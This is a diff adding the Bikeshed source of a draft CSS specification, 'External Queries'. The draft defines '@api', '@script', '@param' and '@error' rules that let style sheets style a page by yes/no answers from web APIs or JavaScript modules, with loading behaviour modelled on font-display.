@@ -1,0 +1,1149 @@
+<pre class=metadata>
+Title: External Queries
+Shortname: external-queries
+Level: none
+Status: LD
+ED: https://arronei.github.io/CSS-Additions/external-queries/spec/
+Repository: arronei/CSS-Additions
+Editor: Arron Eicholz
+Abstract: This specification lets a style sheet ask a source outside CSS a yes-or-no question and style the
+    page by the answer. A one-line '@api' rule names a web API, and a one-line '@script' rule names a
+    JavaScript module, such as <code>@api --moon-phase url("https://moon.example/phase");</code>. '@param'
+    rules hold the styles that apply when a named source answers true, such as
+    <code>@param(--moon-phase, "full")</code>, '@error' rules hold the styles for when it can't answer, such as
+    <code>@error(--moon-phase, 404)</code>, and the ''param()'' test asks the same questions from inside
+    ''if()''. Answers load the way web fonts do, and a keyword after the URL chooses how, as
+    '@font-face/font-display' does: by default rendering waits a short time and a later answer swaps in, while
+    <code>swap</code>, <code>fallback</code>, and <code>optional</code> wait less and use late answers less.
+Markup Shorthands: markdown yes, css yes
+Complain About: accidental-2119 no, missing-example-ids yes
+Assume Explicit For: yes
+</pre>
+
+<pre class=link-defaults>
+spec:css-conditional-3; type:at-rule; text:@media
+spec:css-conditional-3; type:dfn; text:conditional group rule
+spec:css-values-4; type:type; text:<string>
+spec:css-values-4; type:type; text:<number>
+spec:css-values-4; type:type; text:<integer>
+spec:css-values-4; type:type; text:<url>
+spec:css-values-4; type:type; text:<dashed-ident>
+spec:mediaqueries-4; type:type; text:<general-enclosed>
+spec:css-syntax-3; type:type; text:<block-contents>
+spec:fetch; type:dfn; text:request
+spec:fetch; type:dfn; text:network error
+spec:fetch; type:dfn; text:ok status
+spec:html; type:dfn; text:secure context
+spec:html; type:dfn; text:update the rendering
+spec:dom; type:dfn; text:document
+spec:url; type:dfn; text:url
+</pre>
+
+<pre class=anchors>
+spec: css-values-5; urlPrefix: https://drafts.csswg.org/css-values-5/
+    type: function
+        text: if(); url: #funcdef-if
+    type: type
+        text: <if-test>; url: #typedef-if-test
+spec: css-fonts-4; urlPrefix: https://drafts.csswg.org/css-fonts-4/
+    type: dfn
+        text: font block period; url: #font-block-period
+spec: html; urlPrefix: https://html.spec.whatwg.org/multipage/
+    type: dfn
+        text: has a style sheet that is blocking scripts; url: semantics.html#has-a-style-sheet-that-is-blocking-scripts
+        text: fetch an external module script graph; url: webappapis.html#fetch-a-module-script-tree
+        text: scripting is disabled; url: webappapis.html#concept-n-noscript
+spec: csp3; urlPrefix: https://w3c.github.io/webappsec-csp/
+    type: dfn
+        text: connect-src; url: #directive-connect-src
+        text: script-src; url: #directive-script-src
+</pre>
+
+<pre class=biblio>
+{
+    "MEDIAQUERIES-5": {
+        "title": "Media Queries Level 5",
+        "href": "https://drafts.csswg.org/mediaqueries-5/",
+        "publisher": "W3C"
+    },
+    "CSS-VALUES-5": {
+        "title": "CSS Values and Units Module Level 5",
+        "href": "https://drafts.csswg.org/css-values-5/",
+        "publisher": "W3C"
+    }
+}
+</pre>
+
+
+<h2 id=intro>Introduction</h2>
+
+*This section is non-normative.*
+
+Some of what a page's look depends on isn't something CSS can know. A store's site shows an "Open now" badge
+when its API says the store is open. A game shows a holiday theme when its server says an event is running. An
+astronomy site shows the moon as it is tonight, which takes more arithmetic than a style sheet can do. Today each
+of these needs script that asks the question, waits for the answer, and toggles a class, and the logic ends up in
+one file while the styles that depend on it are in another.
+
+This specification lets a style sheet ask the question itself. An '@api' rule gives a web API a name, an
+'@script' rule gives a JavaScript module a name, and each '@param' rule asks a named source whether something is
+true:
+
+<div class=example id=example-intro>
+    <pre highlight=css>
+    @api --moon-phase url("https://moon.example/phase");
+    @api --solar-eclipse url("https://sky.example/eclipse");
+    @script --moon-calc url("/queries/moon.js");
+
+    /* GET https://moon.example/phase?param=full */
+    @param(--moon-phase, "full") {
+      .moon { background-image: url(full-moon.svg); }
+    }
+    @param(--moon-phase, "first-quarter") or (--moon-phase, "last-quarter") {
+      .moon { background-image: url(half-moon.svg); }
+    }
+
+    /* Two sources in one condition */
+    @param(--moon-phase, "full") and (--solar-eclipse, "partial") {
+      .sky { filter: brightness(0.6); }
+    }
+
+    /* The API couldn't answer */
+    @error(--moon-phase) {
+      .moon { display: none; }
+    }
+
+    /* Calls the default export of /queries/moon.js with "new" */
+    @param(--moon-calc, "new") {
+      .moon { opacity: 0.2; }
+    }
+    </pre>
+
+    <pre highlight=js>
+    // /queries/moon.js
+    export default function (name) {
+      return currentPhase(new Date()) === name;
+    }
+    </pre>
+</div>
+
+The answer to every question is true or false. Several '@param' rules can be true at once: each is its own
+question, not a case in a switch. Because questions use only the name, a source can move from a server to a
+script by changing the one line that declares it.
+
+Answers load the way web fonts do. A declaration asks nothing by itself, as an ''@font-face'' rule downloads
+nothing until text uses its font; a source is asked only the questions that style sheets actually ask. Rendering
+waits a short time for answers, so the first paint already shows the right moon; if an answer takes longer, the
+page renders without it, and the styles swap in when it arrives. A page script can't get this timing: a script
+that blocks rendering also blocks parsing and has no time limit, and a script that doesn't block rendering lets
+the first paint show the wrong styles.
+
+A keyword after the URL changes this for each source, as '@font-face/font-display' does for each font:
+<code>swap</code> never holds up the page, and <code>optional</code> skips an answer that misses the first
+paint rather than change the page while someone is reading it.
+
+<div class=example id=example-intro-display>
+    <pre highlight=css>
+    @api --store-open url("/api/store/open") swap;
+    @api --holiday url("/api/holiday/theme") optional;
+    </pre>
+</div>
+
+The ''param()'' test asks the same questions inside a property value, with ''if()'' [[CSS-VALUES-5]]:
+
+<div class=example id=example-intro-if>
+    <pre highlight=css>
+    @api --store-open url("/api/store/open");
+
+    .badge {
+      content: if(param(--store-open): "Open now"; else: "Closed");
+    }
+    </pre>
+</div>
+
+
+<h2 id=syntax>Syntax</h2>
+
+This specification defines four at-rules, one ''if()'' test, and one URL modifier.
+
+<pre class=prod>
+<dfn at-rule export>@api</dfn> = @api <<dashed-ident>> [ <<url>> | <<string>> ] <<query-display>>? ;
+<dfn at-rule export>@script</dfn> = @script <<dashed-ident>> [ <<url>> | <<string>> ] <<query-display>>? ;
+<dfn type export>&lt;query-display></dfn> = block | swap | fallback | optional
+<dfn at-rule export>@param</dfn> = @param <<param-condition>> { <<block-contents>> }
+<dfn at-rule export>@error</dfn> = @error <<error-condition>> { <<block-contents>> }
+
+<dfn type export>&lt;param-condition></dfn> = not <<param-in-parens>>
+                  | <<param-in-parens>> [ and <<param-in-parens>> ]*
+                  | <<param-in-parens>> [ or <<param-in-parens>> ]*
+<dfn type export>&lt;param-in-parens></dfn> = ( <<param-test>> ) | ( <<param-condition>> ) | <<general-enclosed>>
+<dfn type export>&lt;param-test></dfn> = <<dashed-ident>> [ , <<param-value>> ]*
+<dfn type export>&lt;param-value></dfn> = <<string>> | <<number>>
+
+<dfn type export>&lt;error-condition></dfn> = not <<error-in-parens>>
+                  | <<error-in-parens>> [ and <<error-in-parens>> ]*
+                  | <<error-in-parens>> [ or <<error-in-parens>> ]*
+<dfn type export>&lt;error-in-parens></dfn> = ( <<error-test>> ) | ( <<error-condition>> ) | <<general-enclosed>>
+<dfn type export>&lt;error-test></dfn> = <<dashed-ident>> [ , <<error-kind>> ]*
+<dfn type export>&lt;error-kind></dfn> = <<integer [100,599]>> | <dfn value for=@error>unavailable</dfn>
+             | <dfn value for=@error>invalid</dfn> | <dfn value for=@error>timeout</dfn>
+</pre>
+
+The ''if()'' function's <<if-test>> gains one alternative:
+
+<pre class=prod>
+<<if-test>> = ... | <dfn function export lt="param()">param( <<param-test>> )</dfn>
+</pre>
+
+The URL in a [=source declaration=] can carry <<url-modifier>>s [[CSS-VALUES-4]]: the request URL modifiers
+''cross-origin()'', ''integrity()'', and ''referrer-policy()'' [[CSS-VALUES-5]], and one more defined here:
+
+<pre class=prod>
+<dfn function export>timeout()</dfn> = timeout( <<time [0s,∞]>> )
+</pre>
+
+Each can appear at most once, in any order. ''integrity()'' is valid only on an '@script' URL: an '@api' answer
+changes, so it has no fixed hash. A ''timeout()'' of zero, a repeated modifier, ''integrity()'' on an '@api' URL,
+or any other <<url-modifier>> makes the declaration invalid. As with every <<url-modifier>>, they can only follow
+a URL written as <code>url("…")</code>.
+
+A <<param-in-parens>> or <<error-in-parens>> whose first token is a <<dashed-ident>> is a <<param-test>> or
+<<error-test>>; otherwise it is a nested condition. CSS allows white space between an at-rule's name and its
+prelude, so <code>@param(--moon-phase, "full")</code> and <code>@param (--moon-phase, "full")</code> are the same
+rule.
+
+<div class=note>
+    A user agent that doesn't implement this specification ignores '@api' and '@script' rules, and drops
+    '@param' and '@error' rules along with everything in them, so none of their styles apply. Styles that a
+    page needs without an answer go outside them.
+</div>
+
+<h3 id=declaring>Declaring sources</h3>
+
+An '@api' or '@script' rule is a <dfn export>source declaration</dfn>. Its <<dashed-ident>> is its
+<dfn export>source name</dfn>, and its URL, resolved against the style sheet's base URL, is its
+<dfn export>source URL</dfn>. A <<string>> is treated as a URL, as in ''@import''. The time in its ''timeout()''
+modifier, if it has one, is its <dfn export>source timeout</dfn>.
+
+<div class=example id=example-timeout>
+    <pre highlight=css>
+    /* Give up after 10 seconds */
+    @api --store url("/api/store" timeout(10s));
+
+    /* Send cookies to a cross-origin API, and no referrer */
+    @api --rewards url("https://rewards.example/member"
+                       cross-origin(use-credentials) referrer-policy(no-referrer));
+
+    /* Run the module only if its contents match */
+    @script --moon-calc url("https://cdn.example/moon.js"
+                            integrity("sha384-…") timeout(500ms));
+    </pre>
+</div>
+
+A [=source declaration=] is valid at the top level of a style sheet and inside [=conditional group rules=] such
+as ''@media'' and ''@supports'', where ''@font-face'' and ''@keyframes'' are also allowed [[CSS-CONDITIONAL-3]].
+Unlike ''@import'', it can appear in any position, before or after other rules, because it declares a name and
+doesn't bring in rules. Inside a style rule, it is invalid and is ignored.
+
+A declaration inside a [=conditional group rule=] counts only while the rule's conditions are true.
+
+[=Source names=] are [=CSS/tree-scoped name|tree-scoped names=], as ''@keyframes'' names are
+[[CSS-SHADOW-1]]. '@api' and '@script' rules share one set of names. If several [=source declarations=] that
+count declare the same name, the last one in document order is used, as for ''@keyframes''
+[[CSS-ANIMATIONS-1]].
+
+<div class=example id=example-conditional-declaration>
+    <pre highlight=css>
+    @api --hero url("/api/hero/wide");
+
+    @media (width < 40em) {
+      @api --hero url("/api/hero/narrow");   /* used instead on narrow screens */
+    }
+
+    @param(--hero, "sale") { .hero { background-image: url(sale.jpg); } }
+    </pre>
+
+    On a narrow screen, the question goes to <code>/api/hero/narrow</code>. If the window is widened past 40em,
+    the name points back at <code>/api/hero/wide</code>, and the question is asked there, once, as
+    [[#tests]] describes.
+</div>
+
+<h3 id=asking>Asking questions</h3>
+
+'@param' and '@error' rules accept the same contents as ''@media'', and can appear wherever ''@media'' can,
+including inside style rules [[CSS-NESTING-1]]. They can appear before or after the declaration of the name they
+use, and in a different style sheet.
+
+A <<param-test>> asks the source with that name. A name that no [=source declaration=] declares makes the
+<<param-test>> unknown, the same as an undefined custom media query in [[MEDIAQUERIES-5]], so an '@param' rule
+that uses it never applies, an '@error' rule that names it never applies, and a ''param()'' test that uses it is
+false.
+
+
+<h2 id=questions>Questions and answers</h2>
+
+<h3 id=tests>Tests</h3>
+
+A <dfn export>test</dfn> is one question asked of one source. It is identified by:
+
+* its kind: <dfn for=test>api</dfn> or <dfn for=test>script</dfn>, from the [=source declaration=] that its
+    name refers to;
+* that declaration's [=source URL=]; and
+* its <dfn for=test>values</dfn>: the <<param-value>>s of its <<param-test>>, in order, possibly none. A
+    <<string>> value is its string; a <<number>> value is the number.
+
+The values are passed to the source as written. What they mean, and how many a question has, is up to the
+source: <code>@param(--moon, "between", 10, 20)</code> passes three values, and the source decides what to do
+with them.
+
+Each [=document=] has one set of tests. Tests with the same kind, source URL, and values are the same test,
+whatever names they are asked through, wherever they appear, and however many style sheets ask them, so each
+question is asked once. If a name comes to refer to a different source, for example because a later style sheet
+declares it again, its questions become tests of the new source.
+
+A [=test=] has a <dfn for=test>state</dfn>, which starts as <dfn for=test/state>pending</dfn> and becomes one
+of:
+
+: <dfn for=test/state>true</dfn> or <dfn for=test/state>false</dfn>
+:: The source answered.
+: <dfn for=test/state>error</dfn>, with an <<error-kind>>
+:: The source couldn't answer. ''@error/unavailable'' means the question couldn't be asked or the answer
+    couldn't be received; ''@error/invalid'' means the source responded with something other than true or
+    false; ''@error/timeout'' means the [=source timeout=] passed first; an <<integer>> is the HTTP status of
+    an '@api' response that wasn't an [=ok status=].
+
+<h3 id=evaluating>Evaluating '@param' and ''param()''</h3>
+
+A <<param-test>> evaluates to true if its test's [=test/state=] is [=test/state/true=], to false if it is
+[=test/state/false=], and to unknown if it is [=test/state/pending=] or [=test/state/error=], or if its name
+isn't declared. ''not'', ''and'', and ''or'' combine these values as in media queries [[MEDIAQUERIES-4]], and a
+<<general-enclosed>> is unknown.
+
+An '@param' rule applies when its <<param-condition>> is true. A ''param()'' test is true when its
+<<param-test>> is true, and false otherwise.
+
+<div class=note>
+    Pending and errors are unknown, not false, so <code>@param not (--moon-phase, "full")</code> doesn't apply
+    until the source has said it isn't a full moon. Styles for a source that can't answer go in '@error'.
+</div>
+
+<h3 id=evaluating-error>Evaluating '@error'</h3>
+
+An <<error-test>> evaluates to:
+
+: true
+:: if at least one test asked of the source with its name, anywhere in the document, is in the
+    [=test/state/error=] state with a matching kind. An <<error-test>> that lists no <<error-kind>>s matches
+    every kind; otherwise it matches the kinds it lists.
+: unknown
+:: otherwise, if its name isn't declared, or if any test of the source is [=test/state/pending=].
+: false
+:: otherwise.
+
+''not'', ''and'', and ''or'' combine these values as in media queries, and a <<general-enclosed>> is unknown.
+An '@error' rule applies when its <<error-condition>> is true.
+
+<div class=example id=example-error>
+    <pre highlight=css>
+    @api --store url("/api/store" timeout(10s));
+    @api --hours url("/api/hours");
+
+    @param(--store, "open") { .badge::after { content: "Open now"; } }
+
+    /* The store is gone */
+    @error(--store, 404, 410) { .badge { display: none; } }
+
+    /* Offline, or slower than 10 seconds */
+    @error(--store, unavailable, timeout) { .badge { opacity: 0.5; } }
+
+    /* Either source failed */
+    @error(--store) or (--hours) { .status-panel { display: none; } }
+    </pre>
+</div>
+
+While a source's tests are [=test/state/pending=], neither '@param' nor '@error' rules that depend on them apply.
+
+
+<h2 id=loading>When answers arrive</h2>
+
+Declaring a source asks nothing. A test is <dfn export for=test>needed</dfn> when an '@param' rule or
+''param()'' test that asks it is in a style sheet applied to the document, and its name is declared. A user agent
+asks a test as soon as it is needed. It may wait until the rule's ancestor conditions, such as an enclosing
+''@media'', are true, as it may for a conditional ''@import''.
+
+<h3 id=display>Waiting for answers: the <<query-display>> keyword</h3>
+
+Each test has two lengths of time, both starting when it is first [=test/needed=]:
+
+* its <dfn export>query block period</dfn>, during which rendering waits for its answer; and
+* its <dfn export>query swap period</dfn>, which starts at the same moment and lasts at least as long, during
+    which an answer that arrives is still used.
+
+The <<query-display>> keyword of the test's [=source declaration=] sets them, following the values of
+'@font-face/font-display' [[CSS-FONTS-4]]. A declaration without the keyword behaves as ''<query-display>/block''.
+
+<table class=data>
+    <thead>
+        <tr><th>Keyword<th>Query block period<th>Query swap period
+    </thead>
+    <tbody>
+        <tr>
+            <td><dfn value for="<query-display>">block</dfn>
+            <td>Short; 3 seconds is recommended
+            <td>Infinite
+        <tr>
+            <td><dfn value for="<query-display>">swap</dfn>
+            <td>Extremely short; 100 milliseconds or less is recommended
+            <td>Infinite
+        <tr>
+            <td><dfn value for="<query-display>">fallback</dfn>
+            <td>Extremely short; 100 milliseconds or less is recommended
+            <td>Short; 3 seconds is recommended
+        <tr>
+            <td><dfn value for="<query-display>">optional</dfn>
+            <td>Extremely short; 100 milliseconds or less is recommended
+            <td>The same as the block period
+    </tbody>
+</table>
+
+If the style sheet whose rule first needs a test is
+<a href="https://html.spec.whatwg.org/multipage/dom.html#render-blocking">render-blocking</a>, the document
+stays render-blocked until the test leaves the [=test/state/pending=] state, or until its [=query block
+period=] ends, whichever comes first. A test first needed by a style sheet that isn't render-blocking, such as one
+added by script after the page has rendered, never holds up rendering.
+
+A test that is still [=test/state/pending=] when its [=query block period=] ends stays unknown, and its styles
+apply if it answers before its [=query swap period=] ends. If the swap period ends first, the test is
+<dfn for=test>abandoned</dfn> for the rest of the document: it stays unknown, and an answer or an error that
+arrives later, including an ''@error/timeout'', is ignored. Neither '@param' nor '@error' rules that depend on it
+ever apply, so the page shows the styles written outside them. The user agent should still let an
+[=test/abandoned=] '@api' request finish, so that its answer can reach the HTTP cache for the next page load.
+
+The two periods apply only to a test's first answer. Answers to a test asked again, as in [[#script-refresh]],
+always apply, because the page has already rendered.
+
+<div class=note>
+    The extremely short block period of ''<query-display>/swap'', ''<query-display>/fallback'', and
+    ''<query-display>/optional'' is there for answers that are already in the HTTP cache, which arrive in
+    milliseconds. Without it, a cached answer would still show the wrong styles for one frame.
+</div>
+
+<div class=example id=example-display>
+    <pre highlight=css>
+    /* The hero image: worth holding the first paint for (block is the default) */
+    @api --moon-phase url("https://moon.example/phase");
+    @param(--moon-phase, "full") { .hero { background-image: url(full-moon.jpg); } }
+
+    /* A small badge: never hold the page for it, show it when the answer comes */
+    @api --store-open url("/api/store/open") swap;
+    @param(--store-open) { .badge { display: inline-block; } }
+
+    /* A sale banner that pushes content down: show it only if it's fast,
+       so the page doesn't jump while someone is reading */
+    @api --sale url("/api/sale/active" timeout(5s)) fallback;
+    @param(--sale) { .sale-banner { display: block; } }
+
+    /* A whole-page holiday theme: changing it mid-visit is jarring, so skip it
+       this time. The answer lands in the HTTP cache for the next page load. */
+    @api --holiday url("/api/holiday/theme") optional;
+    @param(--holiday, "winter") { :root { --accent: #3a6ea5; --bg: url(snow.svg); } }
+
+    /* The same keywords work for scripts */
+    @script --flags url("/queries/flags.js" integrity("sha384-…")) swap;
+    @param(--flags, "new-nav") { .nav-v2 { display: flex; } }
+    </pre>
+</div>
+
+The keyword goes after <code>url()</code> because it controls rendering, not the request; ''timeout()'',
+''cross-origin()'', and the other modifiers that control the request go inside it.
+
+<h3 id=timeouts>Timeouts</h3>
+
+If a test's [=source declaration=] has a [=source timeout=], and the test hasn't answered that long after it was
+asked, its state becomes [=test/state/error=] ''@error/timeout''. For an '@api' test, the user agent aborts the
+fetch. For an '@script' test, the time includes loading the [=query module=] the first time, and a call that
+settles afterward is ignored. A test asked again, as in [[#script-refresh]], has the full time again.
+
+Without ''timeout()'', a test waits as long as its source takes.
+
+If several declarations have the same source URL but different modifiers, such as different timeouts or
+different ''cross-origin()'' values, a test uses the modifiers of the declaration through which it was first
+asked.
+
+<div class=note>
+    The timeout is separate from the [=query block period=] and [=query swap period=]. Those decide how long
+    rendering waits for an answer and whether a late answer is used; the timeout decides when the test becomes
+    an error that '@error' rules can style.
+</div>
+
+<h3 id=not-blocking>What pending tests don't block</h3>
+
+Pending tests never:
+
+* count toward whether the document [=has a style sheet that is blocking scripts=];
+* delay the <code>DOMContentLoaded</code> or <code>load</code> event; or
+* delay the <code>load</code> event of the element that loaded a style sheet.
+
+[[#cycles]] explains why.
+
+
+<h2 id=api-rule>Asking a web API: the '@api' rule</h2>
+
+<h3 id=api-request>The request</h3>
+
+To ask an [=test/api=] test, the user agent:
+
+1. If the document's relevant settings object is not a [=secure context=], sets the test's state to
+    [=test/state/error=] ''@error/unavailable'' and stops.
+1. Lets |url| be a copy of the [=source URL=].
+1. If the test has [=test/values=], appends one pair to |url|'s query, after an "&" if the query isn't empty:
+    the name <code>param</code>, an "=", and the values separated by commas (","). Each value is its string,
+    or for a number, its serialization as a CSS <<number>>, percent-encoded with the component percent-encode
+    set, as <code>encodeURIComponent()</code> does. A test with no values leaves |url| unchanged.
+1. Creates a [=request=] whose URL is |url|, whose method is <code>GET</code>, whose mode is "cors", whose
+    credentials mode is "same-origin", whose destination is the empty string, whose referrer is the location of
+    the style sheet that declares the source (or the document's URL for a style sheet without one), and whose
+    <code>Accept</code> header is <code>application/external-query+json</code>.
+1. Applies the declaration's request URL modifiers to the request, with
+    [=apply request modifiers from URL value=] [[CSS-VALUES-5]]. Without ''cross-origin()'', the request
+    behaves as with <code>cross-origin(anonymous)</code>: cookies go only to the document's own origin.
+1. Fetches the request.
+
+<div class=example id=example-request>
+    <pre highlight=css>
+    @api --moon url("https://moon.example/phase?lang=en");
+
+    /* GET https://moon.example/phase?lang=en&amp;param=full */
+    @param(--moon, "full") { … }
+
+    /* GET https://moon.example/phase?lang=en&amp;param=between,10,20 */
+    @param(--moon, "between", 10, 20) { … }
+
+    /* GET https://moon.example/phase?lang=en&amp;param=a%2Cb,c */
+    @param(--moon, "a,b", "c") { … }
+
+    /* GET https://moon.example/phase?lang=en */
+    @param(--moon) { … }
+    </pre>
+</div>
+
+<div class=note>
+    A comma inside a value is sent as <code>%2C</code>, so a server can tell it from a separator by splitting the
+    parameter at commas before percent-decoding it. The name <code>param</code> leaves room for other names
+    later, such as <code>sort</code> or <code>group</code>.
+</div>
+
+Each test is asked once per document. The answer doesn't change while the document is open; a reload asks again,
+subject to the HTTP cache.
+
+Each test is its own request; a user agent never combines several tests into one. This follows web fonts: a font
+family split into several files with '@font-face/unicode-range' is fetched one file at a time, and only the
+files the page uses [[CSS-FONTS-4]].
+
+The request is governed by the document's Content Security Policy as a request made by
+<code>fetch()</code> would be, through [=connect-src=]. This follows how every request from CSS is governed: by
+the directive for its kind of resource. ''@import'' uses <code>style-src</code>, fonts use
+<code>font-src</code>, images use <code>img-src</code>, and a request for data uses [=connect-src=].
+
+<h3 id=api-response>The answer</h3>
+
+The test's state is:
+
+: [=test/state/error=] ''@error/unavailable''
+:: if the fetch returns a [=network error=], including a CORS failure or a request blocked by policy.
+: [=test/state/error=] with the response's status
+:: if the status is not an [=ok status=].
+: [=test/state/error=] ''@error/invalid''
+:: if the response's MIME type essence is not <code>application/external-query+json</code>, or its body,
+    parsed as JSON, is not an object with a <code>result</code> member whose value is a boolean.
+: [=test/state/true=] or [=test/state/false=]
+:: otherwise, from the value of <code>result</code>.
+
+<div class=example id=example-response>
+    <pre>
+    HTTP/1.1 200 OK
+    Content-Type: application/external-query+json
+    Access-Control-Allow-Origin: *
+
+    {"result": true}
+    </pre>
+</div>
+
+Members other than <code>result</code> are ignored, so that later versions can add them.
+
+<div class=note>
+    The answer has a media type of its own so that only endpoints built to answer style sheets do. A
+    style sheet can't read a page's other APIs, even on its own origin. [[#security-api]] explains the attack this
+    prevents.
+</div>
+
+
+<h2 id=script-rule>Asking a script: the '@script' rule</h2>
+
+<h3 id=script-module>The module</h3>
+
+An '@script' rule's [=source URL=] names a JavaScript module, called its <dfn export>query module</dfn>. The
+module's default export is the function that answers its tests:
+
+<div class=example id=example-module>
+    <pre highlight=css>
+    @script --moon-calc url("/queries/moon.js");
+
+    @param(--moon-calc, "full") { .moon { background-image: url(full-moon.svg); } }
+    </pre>
+
+    <pre highlight=js>
+    // /queries/moon.js
+    import { phaseOn } from "./astronomy.js";
+
+    export default function (name) {
+      return phaseOn(new Date()) === name;   // true or false
+    }
+
+    // Optional: tell CSS when answers may have changed.
+    export function watch(refresh, signal) {
+      const timer = setInterval(refresh, 60 * 60 * 1000);
+      signal.addEventListener("abort", () => clearInterval(timer));
+    }
+    </pre>
+</div>
+
+A [=query module=] is loaded when one of its tests is first [=test/needed=]. To load it, the user agent:
+
+1. If any of these is true, sets the state of every test of the module to [=test/state/error=]
+    ''@error/unavailable'' and stops:
+    * The document's relevant settings object is not a [=secure context=].
+    * [=Scripting is disabled=] for the document.
+    * The style sheet that contains the '@script' rule is not same origin with the document. A style sheet
+        created by a <code>style</code> element or by script has the document's origin.
+1. Fetches the module, and the modules it imports, as <code>&lt;script type=module></code> would: with
+    [=fetch an external module script graph=], the document's relevant settings object, the destination
+    "script", and the style sheet's location as the referrer. The fetch uses the
+    <a href="https://html.spec.whatwg.org/multipage/dom.html#concept-document-module-map">document's module
+    map</a>, so a module that the page has already imported is not fetched or run again. Its script fetch
+    options are:
+    * credentials mode "include" with <code>cross-origin(use-credentials)</code>, and "same-origin"
+        otherwise;
+    * integrity metadata from ''integrity()'', or none;
+    * referrer policy from ''referrer-policy()'', or the default;
+    * no cryptographic nonce; and
+    * parser metadata "parser-inserted".
+1. If the module can't be fetched or fails to evaluate, sets the state of every test of the module to
+    [=test/state/error=] ''@error/unavailable''.
+1. If the module's default export is not a function, sets the state of every test of the module to
+    [=test/state/error=] ''@error/invalid''.
+1. Otherwise, if the module has an export named <code>watch</code> that is a function, calls it once with a
+    <var>refresh</var> function and an <code>AbortSignal</code>, then asks every test of the module.
+
+The module is governed by the document's Content Security Policy as a module script is, through
+[=script-src=] [[CSP3]]:
+
+* The request carries no nonce, so a policy can't allow a query module by nonce.
+* A policy can allow it by its URL, or, when the declaration has ''integrity()'', by a hash that matches it, as
+    for any external script with integrity metadata.
+* The request is marked as parser-inserted so that <code>&#39;strict-dynamic&#39;</code>, which trusts scripts that
+    trusted scripts load, doesn't trust a module that a style sheet loads.
+
+''integrity()'' applies to the module the declaration names. The modules it imports are checked as imports
+always are, for example against the integrity metadata in an import map.
+
+The signal is aborted when no '@script' rule in the document declares the module any more.
+
+<h3 id=script-test>Asking the module</h3>
+
+To ask a [=test/script=] test, the user agent calls the module's default export with the test's
+[=test/values=] as arguments, possibly none: strings as JavaScript strings and numbers as JavaScript numbers.
+The call happens in a task, never during style or layout.
+
+The test's state becomes:
+
+: [=test/state/true=] or [=test/state/false=]
+:: if the function returns <code>true</code> or <code>false</code>, or returns a promise that fulfills with
+    one of them.
+: [=test/state/error=] ''@error/invalid''
+:: if it returns any other value, including a truthy or falsy value that isn't a boolean, throws, or returns a
+    promise that rejects or fulfills with anything else.
+
+While a promise is unsettled, the test stays as it was: [=test/state/pending=] the first time, and its previous
+state after that.
+
+<h3 id=script-refresh>Asking again</h3>
+
+Calling <var>refresh</var> marks every test of the module as needing to be asked again. During the next
+[=update the rendering=] of the document, just after animation frame callbacks run, the user agent asks each
+marked test once. A test whose previous call hasn't settled is asked again after it settles.
+
+Calls to <var>refresh</var> between two renderings are combined, so a module is asked at most once per frame.
+
+A test needed for the first time after the module has loaded, for example because of a rule added with
+<code>insertRule()</code>, is asked in a task straight away; it doesn't wait for a rendering.
+
+If a test's answer changes in each of several consecutive renderings, the user agent should report it to the
+developer console, as it reports a <code>ResizeObserver</code> loop, naming the [=source name=] and the values.
+It keeps asking the test, at most once per frame. [[#cycles]] explains why, and
+<a href="#issue-stop-loops">an open issue</a> asks whether there should be a way to stop.
+
+
+<h2 id=cycles>Script timing and cycles</h2>
+
+*This section is non-normative.*
+
+A [=query module=] runs in the page, so it can read anything the page can: the DOM, application state,
+<code>localStorage</code>. That is what makes it useful, and it is also how it can loop. These are the cases
+this specification has to handle, and how it handles each.
+
+<h3 id=cycle-style>Style that depends on its own answer</h3>
+
+A test that reads computed style or layout, such as <code>getComputedStyle()</code> or
+<code>offsetWidth</code>, can read styles that its own answer changed. If it then calls <var>refresh</var> from
+a <code>ResizeObserver</code> or <code>MutationObserver</code>, the answer can flip on every frame: true applies
+styles that make it false, and false removes them.
+
+Three rules keep this from hanging the page:
+
+* Tests never run during style or layout, so style can't re-enter script.
+* Refreshes are combined and run at most once per frame, so a flip costs one frame. The worst case is
+    flicker, not a frozen page.
+* A test that keeps flipping is reported to the developer console, so the author can find it.
+
+This follows <code>ResizeObserver</code>, which has the same problem: an observer can resize the element it
+observes. It never stops observing; it moves work it can't finish to the next frame and reports a loop error.
+Container queries avoid the problem a different way, with containment. A test that depends on layout should ask
+about something its answer doesn't change.
+
+<h3 id=cycle-render-blocking>Waiting for rendering while rendering waits</h3>
+
+While a style sheet is render-blocking, the document doesn't render, so animation frame callbacks don't run. A
+test that waits for a frame, for example with <code>await new Promise(requestAnimationFrame)</code>, would wait
+forever for a rendering that waits for it.
+
+Two rules break this:
+
+* The [=query block period=] always ends, and then the document renders without the answer.
+* A module's first answers are asked for in a task as soon as it loads, not during a rendering, so they never
+    need a frame to start.
+
+<h3 id=cycle-loading>Waiting for the page while the page waits</h3>
+
+If pending tests made their style sheet block scripts, or delayed <code>DOMContentLoaded</code> or
+<code>load</code>, then a test that waits for one of those, for example to read <code>document.body</code>,
+would wait for an event that waits for it. Pending tests delay none of them. A query module can run before the
+document has finished parsing, so a test that needs the DOM should wait for <code>DOMContentLoaded</code>.
+
+<h3 id=cycle-cssom>Tests that change style sheets</h3>
+
+A test can change the style sheets that ask it, for example by inserting another '@param' rule. Each new set of
+values is a new test, asked once, so this can't loop on its own; a test that keeps inventing values keeps
+creating tests, as any script can keep creating rules. A test can also declare a name again, pointing it at
+another source; the questions then go to that source once, as described in [[#tests]]. Removing the last
+'@script' rule for a module aborts its <code>watch</code> signal, and answers that arrive afterward are ignored.
+
+<h3 id=cycle-modules>Modules that load modules</h3>
+
+A query module can import the page's own modules and share their state, because it uses the document's module
+map. A module runs once per document however many style sheets declare it, so a test that inserts a style sheet
+declaring the same module doesn't load it again.
+
+<h3 id=cycle-between>Tests that depend on other tests</h3>
+
+A test can read styles that another test's answer sets. Answers arrive in no particular order, so it may read
+them before the other answer arrives. It isn't asked again when the other answer arrives unless it calls
+<var>refresh</var>, which brings back the per-frame limit above.
+
+
+<h2 id=cssom>CSSOM</h2>
+
+<pre class=idl>
+[Exposed=Window]
+interface CSSAPIRule : CSSRule {
+  readonly attribute CSSOMString name;
+  readonly attribute USVString href;
+  readonly attribute CSSOMString display;
+};
+
+[Exposed=Window]
+interface CSSScriptRule : CSSRule {
+  readonly attribute CSSOMString name;
+  readonly attribute USVString href;
+  readonly attribute CSSOMString display;
+};
+
+[Exposed=Window]
+interface CSSParamRule : CSSConditionRule {
+};
+
+[Exposed=Window]
+interface CSSErrorRule : CSSConditionRule {
+};
+</pre>
+
